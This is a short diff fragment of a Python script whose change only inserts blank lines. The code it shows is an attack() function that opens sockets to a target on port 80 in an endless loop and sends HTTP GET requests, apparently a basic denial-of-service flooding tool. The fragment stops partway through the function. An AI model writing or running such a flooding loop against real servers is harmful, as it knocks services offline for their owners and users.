@@ -7,10 +7,12 @@ port = 80
 
 attack_num = 0
 
+
 def attack():
     while True:
         soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         soc.connect((target, port))
+
         soc.sendto(("GET /"+target+" HTTP/1.1\r\n").encode("ascii"), 
                    (target, port))
         
